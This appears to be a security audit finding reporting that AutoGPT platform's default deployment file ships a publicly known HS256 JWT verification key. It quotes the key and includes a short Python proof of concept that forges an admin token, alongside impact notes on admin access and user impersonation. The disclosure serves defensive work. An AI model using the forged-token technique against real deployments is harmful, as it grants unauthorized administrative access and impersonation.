# Repository-public JWT verification key in default deployment

**Verification: CODE-VERIFIED**

## Description
`autogpt_platform/backend/.env.default:50`:
```
JWT_VERIFY_KEY=your-super-secret-jwt-token-with-at-least-32-characters-long
```
The docker-compose deployment loads this file by default. The JWT JWKS URL satisfies boot validation. Anyone who reads the public repository knows the HS256 signing key.

## Impact
Anyone forges HS256 tokens with arbitrary `sub`/`role` (exp can be omitted):
- Full platform authentication
- Admin API access
- X-Act-As-User impersonation

## PoC
```python
import jwt
token = jwt.encode(
    {"sub": "admin", "role": "admin"},
    "your-super-secret-jwt-token-with-at-least-32-characters-long",
    algorithm="HS256"
)
# Use this token against any AutoGPT platform API
```

## Execution result
```
Code path analysis: .env.default:50 contains the known JWT key;
docker-compose loads it; jwt_utils.py:100-135 verifies HS* against
JWT_VERIFY_KEY when set.
```
